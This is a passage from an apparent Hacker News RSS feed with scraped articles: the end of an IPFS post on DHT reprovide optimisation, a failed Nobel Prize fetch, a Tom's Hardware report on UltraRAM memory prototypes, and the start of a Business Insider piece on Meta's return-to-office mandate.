DHT lookups</td> <td>#CIDs</td> <td>~1/20 * #DHT_SERVERs</td></tr> <tr><td>Number of connections to open</td> <td>20 * #CIDs</td> <td>#DHT_SERVERs</td></tr></tbody></table> <table><thead><tr><th>#CIDs published</th> <th>Improvement (#connections, #DHT Lookups)</th></tr></thead> <tbody><tr><td>&gt; 1K</td> <td>-</td></tr> <tr><td>25K</td> <td>20x</td></tr> <tr><td>100K</td> <td>80x</td></tr> <tr><td>500K</td> <td>400x</td></tr> <tr><td>1M</td> <td>800x</td></tr> <tr><td>10M</td> <td>8’000x</td></tr></tbody></table> <h3 id="expected-changes-timeline-2"><a href="#expected-changes-timeline-2">#</a> Expected Changes &amp; Timeline</h3> <p>We are very excited about this change because it will enable large content providers to start using the most resilient and decentralized component of the IPFS network.</p> <p><strong>This change is a client side optmization and doesn’t involve any protocol alteration.</strong> As such, it allows users to immediately benefit from the feature. The interface between <code>go-libp2p-kad-dht</code> and <a href="https://github.com/ipfs/boxo" target="_blank" rel="noopener noreferrer"><code>boxo</code><span> <span>(opens new window)</span></span></a>, which Kubo uses, must be updated to enable the DHT client to take on the responsibility of managing the reprovide operation.</p> <p>The PL EngRes IPFS Stewards team is currently working to define the spec for <code>ReprovideSweep</code>, which we hope to have ready in the beginning of October, and we anticipate rolling out this enhancement during Q4’23. We will update the community with a new blogpost or discussion forum post closer to the time. Until then, you can follow developments on this front through this GH issue: <a href="https://github.com/libp2p/go-libp2p-kad-dht/issues/824" target="_blank" rel="noopener noreferrer">https://github.com/libp2p/go-libp2p-kad-dht/issues/824<span> <span>(opens new window)</span></span></a>.</p> <h2 id="what-s-next"><a href="#what-s-next">#</a> What’s next</h2> <p>We believe the above lays the groundwork for more exciting DHT innovation ahead. We have some ideas that we’d love to be talking about and working with the community. We’re still figuring out the best place for this conversation, but subscribe <a href="https://discuss.ipfs.tech/t/dht-discussion-and-contribution-opportunities-in-2023q4/16937" target="_blank" rel="noopener noreferrer">here<span> <span>(opens new window)</span></span></a> if you’re interested in learning about upcoming DHT discussion areas (e.g., at <a href="https://labweek.plnetwork.io/" target="_blank" rel="noopener noreferrer">LabWeek<span> <span>(opens new window)</span></span></a>/<a href="https://devconnect.org/" target="_blank" rel="noopener noreferrer">DevConnect<span> <span>(opens new window)</span></span></a>, DHT working group). You can also join the team's Office Hours by subscribing at: <a href="https://lu.ma/ipfs-network-measurements" target="_blank" rel="noopener noreferrer">https://lu.ma/ipfs-network-measurements<span> <span>(opens new window)</span></span></a>.</p> <h2 id="how-to-get-involved"><a href="#how-to-get-involved">#</a> How to get involved</h2> <p>As always, help is more than welcome to accelerate development and make the design more robust through feedback. Here are ways you can get involved:</p> <ul><li>Github repository:
<ul><li>DHT Refactoring: <a href="https://github.com/plprobelab/go-kademlia/" target="_blank" rel="noopener noreferrer">https://github.com/plprobelab/go-kademlia/<span> <span>(opens new window)</span></span></a></li> <li>Reprovide Sweep: <a href="https://github.com/libp2p/go-libp2p-kad-dht/issues/824" target="_blank" rel="noopener noreferrer">https://github.com/libp2p/go-libp2p-kad-dht/issues/824<span> <span>(opens new window)</span></span></a></li></ul></li> <li>Slack channel:
<ul><li><code>#probe-lab</code> in <a href="https://filecoin.io/slack" target="_blank" rel="noopener noreferrer">FIL Slack<span> <span>(opens new window)</span></span></a> or <a href="https://discord.gg/vj7qWuAyHY" target="_blank" rel="noopener noreferrer">IPFS Discord<span> <span>(opens new window)</span></span></a> (bridged channel), or</li> <li><code>#kubo-boxo-dev</code> in FIL Slack</li></ul></li> <li>IPFS Discussion forum:
<ul><li>DHT Refactoring and future planning: <a href="https://discuss.ipfs.tech/t/dht-discussion-and-contribution-opportunities-in-2023q4/16937" target="_blank" rel="noopener noreferrer">https://discuss.ipfs.tech/t/dht-discussion-and-contribution-opportunities-in-2023q4/16937<span> <span>(opens new window)</span></span></a></li></ul></li></ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Nobel Prize in Physics Awarded to Agostini, Krausz, and L’Huillier (261 pts)]]></title>
            <link>https://www.nobelprize.org/prizes/physics/2023/summary/</link>
            <guid>37749753</guid>
            <pubDate>Tue, 03 Oct 2023 09:50:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nobelprize.org/prizes/physics/2023/summary/">https://www.nobelprize.org/prizes/physics/2023/summary/</a>, See on <a href="https://news.ycombinator.com/item?id=37749753">Hacker News</a></p>
Couldn't get https://www.nobelprize.org/prizes/physics/2023/summary/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[UltraRAM (266 pts)]]></title>
            <link>https://www.tomshardware.com/news/ultraram-demos-prototype-chip-secures-funding-to-validate-commercial-potential</link>
            <guid>37749207</guid>
            <pubDate>Tue, 03 Oct 2023 08:17:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.tomshardware.com/news/ultraram-demos-prototype-chip-secures-funding-to-validate-commercial-potential">https://www.tomshardware.com/news/ultraram-demos-prototype-chip-secures-funding-to-validate-commercial-potential</a>, See on <a href="https://news.ycombinator.com/item?id=37749207">Hacker News</a></p>
<div id="readability-page-1" class="page"><article aria-label="article" data-id="BwzLL3qYWvjaxwgsYqqwQ8">
<header>
<nav aria-label="Breadcrumbs">
<ol>
<li>
<a href="https://www.tomshardware.com/news" aria-label="Return to News">News</a>
</li>
</ol>
</nav>


</header>
<section>
<div itemprop="image" itemscope="" itemtype="https://schema.org/ImageObject">
<div>
<picture><source type="image/webp" alt="UltraRAM feature" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" srcset="https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-1920-80.jpg.webp 1920w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh.jpg"><source type="image/jpeg" alt="UltraRAM feature" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" srcset="https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-1920-80.jpg 1920w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh.jpg"><img src="https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-320-80.jpg" alt="UltraRAM feature" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" srcset="https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh-1920-80.jpg 1920w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh.jpg"></picture>
</div>
<meta itemprop="url" content="https://cdn.mos.cms.futurecdn.net/j4vbwfiFWn5aLEtpodvrFh.jpg">
<meta itemprop="height" content="600">
<meta itemprop="width" content="338">
<figcaption itemprop="caption description">
<span itemprop="copyrightHolder">(Image credit: Future)</span>
</figcaption>
</div>

<div id="article-body">
<div><p>This week, we met up with <a href="https://quinas.tech/news/fms2023/" data-url="https://quinas.tech/news/fms2023/">QuInAs Technology</a>. This recently formed company has been spun off from Lancaster University’s Physics Department to further develop and commercialize UltraRAM. We were allowed to see the actual UltraRAM memory chips for the first time in a test vehicle at the company's lab at Lancaster University in Lancaster, Lancashire, England.</p><p>

This potentially disruptive tech is designed to blend the non-volatility of flash storage with faster-than-DRAM speeds. The memory retains data even after power is removed, and the company claims it has at least 4,000X more endurance than NAND and can store data for 1,000+ years. It is also designed to have 1/10th the latency of DRAM and be more energy efficient (by a factor of 100X) than DRAM fabricated on a similar node, drawing the interest of industry heavyweights like Meta.&nbsp;</p></div><p>The last time we <a href="https://www.tomshardware.com/news/ultraram-implemented-in-silicon-for-first-time">reported on UltraRAM</a> was back in January 2022. Since that time, QuInAs technology has continued to develop, refine, and test the new memory. However, over recent months, the biggest changes have come on the business side of things – which is vital for any startup wanting to bring their tech to market.</p><h2 id="lancaster-labs-tour">Lancaster Labs Tour</h2><p>We were given a tour of the UltraRAM lab to get a first-hand look at the Physics Department’s semiconductor equipment, discuss the various fabrication techniques available at the lab, and discuss the equipment's capabilities and limits. We were also shown a working prototype of the memory riding on a test vehicle.</p><p>The best technology available at the lab will help the researchers create UltraRAM devices with features as small as 20nm. Progress to this point will take place over the next few months, and some expensive new testing and verification equipment will arrive shortly to assess UltraRAM scaling efforts.</p><div aria-hidden="false" data-swipeable="true" data-hydrate="true" id="slice-container-BwzLL3qYWvjaxwgsYqqwQ8-imageGallery-5"><div><figure data-bordeaux-image-check="false"><div data-hydrate="true"><p><img src="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" alt="UltraRAM feature"></p></div><figcaption><span itemprop="copyrightHolder">(Image credit: Future)</span></figcaption></figure></div><p>UltraRAM gold wire bonding</p></div><p>Another important part of the lab tour was looking at a technology central to UltraRAM’s unique proposition. We looked at the <a href="https://www.sciencedirect.com/topics/chemistry/molecular-beam-epitaxy" data-url="https://www.sciencedirect.com/topics/chemistry/molecular-beam-epitaxy">MBE</a> (Molecular Beam Epitaxy) equipment, which precisely deposits the semiconductor layers (GaSb, InAs, and AlSb) required by UltraRAM technology.</p><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" alt="UltraRAM feature" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" data-normal="https://vanilla.futurecdn.net/tomshardware/media/img/missing-image.svg" data-srcset="https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-1200-80.jpg.webp 1200w" data-sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg.jpg"><source type="image/jpeg" alt="UltraRAM feature" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" data-normal="https://vanilla.futurecdn.net/tomshardware/media/img/missing-image.svg" data-srcset="https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-1200-80.jpg 1200w" data-sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg.jpg"><img src="https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg.jpg" alt="UltraRAM feature" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" data-normal="https://vanilla.futurecdn.net/tomshardware/media/img/missing-image.svg" data-srcset="https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-1200-80.jpg 1200w" data-sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg.jpg" srcset="https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/u3HzcEn9kFGGke9Cot5dhg-1200-80.jpg 1200w"></picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Future)</span></figcaption></figure><h2 id="the-technology-behind-ultraram">The Technology Behind UltraRAM</h2><p>A triple-barrier resonant tunneling (TBRT) structure is key to UltraRAM’s advances. This highly resistive structure plays a similar role to flash NAND’s oxide layer but, according to the Lancaster University team, can facilitate data storage for 1,000+ years.</p><p>UltraRAM is a charge-based memory that uses a floating gate, like flash NAND. Also like flash, the charge state of the floating gate is read non-destructively by measuring the conductance of an underlying ‘channel.’ However, unlike flash, UltraRAM doesn't wear during program and erase cycles because of its TBRT structure.&nbsp;</p><p>This is a major qualifier for the durability claims of 10 million write/erase cycles, and the researchers behind UltraRAM are confident enough to claim future testing is expected to see this durability estimate revised upwards. Meanwhile, mainstream TLC 3D NAND might see gate degradation after a <a href="https://blog.elcomsoft.com/2019/01/why-ssds-die-a-sudden-death-and-how-to-deal-with-it/" data-url="https://blog.elcomsoft.com/2019/01/why-ssds-die-a-sudden-death-and-how-to-deal-with-it/">few thousand</a> writes.</p><div aria-hidden="false" data-swipeable="true" data-hydrate="true" id="slice-container-BwzLL3qYWvjaxwgsYqqwQ8-imageGallery-10"><figure data-bordeaux-image-check="false"><div data-hydrate="true"><p><img src="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" alt="UltraRAM feature"></p></div><figcaption><span itemprop="copyrightHolder">(Image credit: QuInAs Technology)</span></figcaption></figure></div><p>Another key claim about UltraRAM is that the floating gate can be switched “extremely quickly and with very little energy,” again these attractive qualities are due to the quantum mechanical phenomenon of resonant tunneling. The benefits are claimed to include UltraRAM’s 100x lower switching energy than DRAM on the same node (1,000x lower than NAND). Moreover, the UltraRAM researchers asserted that the new memory tech is expected to be capable of 1ns write operations, which is about 10x faster than DRAM.</p><div data-nosnippet=""><p><iframe data-lazy-priority="high" data-lazy-src="https://www.youtube.com/embed/iz-sYyfojw4" allowfullscreen=""></iframe></p></div><h2 id="business-boosters">Business Boosters</h2><p>Two major events have helped QuInAs feel more confident of UltraRAM’s eventual commercial success. Firstly, at the Flash Memory Summit in August, <a href="https://quinas.tech/news/fms2023/" data-url="https://quinas.tech/news/fms2023/">UltraRAM won an award</a> for the “Most Innovative Flash Memory Startup.” We heard that those interested in the future of the technology at the Santa Clara event included Meta (Facebook), who were particularly interested in the UK memory startup's power-saving claims.</p><p>Secondly, QuInAs has gained significant financial backing via an ICURe Exploit grant from <a href="https://www.ukri.org/councils/innovate-uk/" data-url="https://www.ukri.org/councils/innovate-uk/">Innovate UK</a>. The funding win will soon be announced in full by QuInAs, but we know that it was awarded for demonstrating commercial viability and leading-edge science over an intensive six-month program.</p><p>With the funding rubber-stamped, the UltraRAM developers are committed to the following:</p><ul><li>To test nanometer scale UltraRAM devices for further proving up of claims regarding performance, efficiency, and durability.</li><li>To cooperate with investors and move towards small volume production.</li></ul><p>The wheels of business have certainly been in motion in recent months with the formation of QuInAs. Moreover, earlier this month, a government-sponsored UK Pavilion exhibition at <a href="https://semicontaiwan.org/" data-url="https://semicontaiwan.org/">SEMICON</a> Taiwan 2023 was useful for discussions with potential technology and manufacturing partners. We gleaned from our talks with QuInAs that they might find manufacturing partners in Taiwan instead of Europe (IMEC, Belgium).</p><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" alt="QuInAs team" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" data-normal="https://vanilla.futurecdn.net/tomshardware/media/img/missing-image.svg" data-srcset="https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-1200-80.jpg.webp 1200w" data-sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng.jpg"><source type="image/jpeg" alt="QuInAs team" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" data-normal="https://vanilla.futurecdn.net/tomshardware/media/img/missing-image.svg" data-srcset="https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-1200-80.jpg 1200w" data-sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng.jpg"><img src="https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng.jpg" alt="QuInAs team" onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" data-normal="https://vanilla.futurecdn.net/tomshardware/media/img/missing-image.svg" data-srcset="https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-1200-80.jpg 1200w" data-sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng.jpg" srcset="https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/bwGs3FqpjhzSuMGTQbmqng-1200-80.jpg 1200w"></picture></p></div><figcaption itemprop="caption description"><span>QuInAs is headed up by tech entrepreneur James Ashforth-Pook, with Lancaster University Physics dept staff Prof. Manus Hayne and Dr. Peter Hodgson acting as Chief Scientific Officer and Chief Technology Officer, respectively. </span><span itemprop="copyrightHolder">(Image credit: QuInAs Technology)</span></figcaption></figure><h2 id="what-next-for-ultraram-and-quinas-technology">What Next for UltraRAM and QuInAs Technology?</h2><p>QuInAs is about to set off on a one-year plan in line with the stated funding goals of both technical and commercial progress.</p><p>Better testing machinery is on the way to help with key process scaling and refinement steps. Moreover, <a href="https://iitr.ac.in/Institute/About%20the%20Institute/index.html" data-url="https://iitr.ac.in/Institute/About%20the%20Institute/index.html">IIT Roorkee</a> in India will work as a partner to model UltraRAM performance in wider contexts. This collaboration should help develop the technology and help steer it towards its full potential.</p><p>As with all new memory technologies, the challenges of producing the new memory economically in large-scale production will prove to be a key hurdle. On the topic of the first markets for UltraRAM, QuInAs Technology is leaving options open for now, as impending work will shine a clearer light on strengths and any possible weaknesses. It seems that if all goes to plan, the initial small production runs will be targeted at the top of the memory pyramid, as it is the most lucrative segment to address.&nbsp;</p>
</div>
<div data-hydrate="true" id="slice-container-newsletterForm-articleInbodyContent"><section><p>Join the experts who read Tom's Hardware for the inside track on enthusiast PC tech news — and have for over 25 years. We'll send breaking news and in-depth reviews of CPUs, GPUs, AI, maker hardware and more straight to your inbox.</p></section></div>
<div id="slice-container-authorBio"><p>Mark Tyson is a Freelance News Writer at Tom's Hardware US. He enjoys covering the full breadth of PC tech; from business and semiconductor design to products approaching the edge of reason.</p></div>



<!-- Drop in a standard article here maybe? -->


</section>




<div id="slice-container-relatedArticles"><p><h5>Most Popular</h5></p></div>

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Meta's Mandatory Return to Office Is 'A Mess' (115 pts)]]></title>
            <link>https://www.businessinsider.com/meta-rto-mess-return-to-office-remote-work-2023-9</link>
            <guid>37748602</guid>
            <pubDate>Tue, 03 Oct 2023 06:37:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.businessinsider.com/meta-rto-mess-return-to-office-remote-work-2023-9">https://www.businessinsider.com/meta-rto-mess-return-to-office-remote-work-2023-9</a>, See on <a href="https://news.ycombinator.com/item?id=37748602">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-component-type="content-lock" data-load-strategy="exclude">
                                  <ul><li>The company formerly known as Facebook is now enforcing an RTO mandate of 3 days a week.</li><li>Workers said there's not enough office space or privacy. They must comply or be fired.</li><li>Many have applied to be remote. Until OKd, office work is required, even when teams are elsewhere.</li></ul><p><a target="_blank" href="https://www.businessinsider.com/meta-rehiring-workers-from-layoffs-2023-8" data-analytics-product-module="body_link" rel="">Meta</a>'s return to office mandate has gone about as well as the <a target="_blank" href="https://www.businessinsider.com/mark-zuckerberg-metaverse-losses-top-40-billion-suddenly-ok-meta-2023-7" data-analytics-product-module="body_link" rel="">metaverse</a> so far.</p><p>As of September 5, effectively all of the roughly 65,000 workers <a target="_blank" href="https://www.businessinsider.com/mark-zuckerberg-meta-layoffs-second-round-job-cuts-2023-3" data-analytics-product-module="body_link" rel=""><u>still employed</u></a> by the company are required to be in an office at least three days a week. Attendance is tracked daily and failure to comply could lead to an employee <a target="_blank" href="https://www.businessinsider.com/all-rules-of-metas-new-aggressive-strict-rto-mandate-2023-8" data-analytics-product-module="body_link" rel=""><u>being fired</u></a>.</p><p>So, thousands of Meta employees have trekked back to offices. They've been met a lack of space and privacy, along with productivity challenges, after a sudden shift away from what were very pro-remote work policies.</p><p><span></span><span><p>"It's a mess," one current employee said of Meta's <a target="_blank" href="https://www.businessinsider.com/amazon-forced-rto-tracking-employee-office-attendance-2023-9" data-analytics-product-module="body_link" rel="">RTO</a> so far. "And all of this because it's difficult to remote onboard new hires. Instead of solving that problem, they just decided let's go back to exactly how it was before."</p><h2>Sitting on the floor</h2><p>One consistent problem is a lack of conference rooms to have team meetings, according to three employees. Sources asked not to be identified because they're not authorized to speak to the press.</p><p>All noted that this was also an issue at Meta in 2019, prior to the pandemic ushering in a wave of white collar jobs being done from home. But the company had fewer employees then.</p><p>Now, it's a challenge to get a conference room at all, the people said, much less one large enough for an entire team to meet for an hour or two.</p><p>One person noted that, after days of trying to get a room for a meeting at Meta's campus in Menlo Park, a small room became available. The person jumped on it, although most of the team ended up sitting on the floor as they worked through an issue during the meeting, given a lack of chairs and table space.</p><p>"We've worked to address this with more collaborative spaces and workstations that allow for video calls and focused work," a Meta spokesman said. "It's important to note that we have roughly 80 offices around the world and our working to make sure our teams have the best experience possible as we welcome people back to the office."</p><h2>Hot desks</h2><figure data-type="img" data-e2e-name="image-figure-image" data-media-container="image" itemscope="" itemtype="https://schema.org/ImageObject">
                          
                          
                          
                            <p><img src="data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg xmlns='http://www.w3.org/2000/svg' width='1' height='1'/%3E" data-content-type="image/jpeg" data-srcs="{&quot;https://i.insider.com/5ffda902bde805001980c560&quot;:{&quot;contentType&quot;:&quot;image/jpeg&quot;,&quot;aspectRatioW&quot;:3000,&quot;aspectRatioH&quot;:2000}}" alt="Adam Mosseri" itemprop="contentUrl">
                        </p>
                          
                          <span>
                                <figcaption data-e2e-name="image-caption">
                                  Adam Mosseri
                                </figcaption>
                                
                          <span data-e2e-name="image-source" itemprop="creditText">
                          
                          Matt Winkelmeyer/Getty Images for WIRED
                          
                          </span>
                              </span>
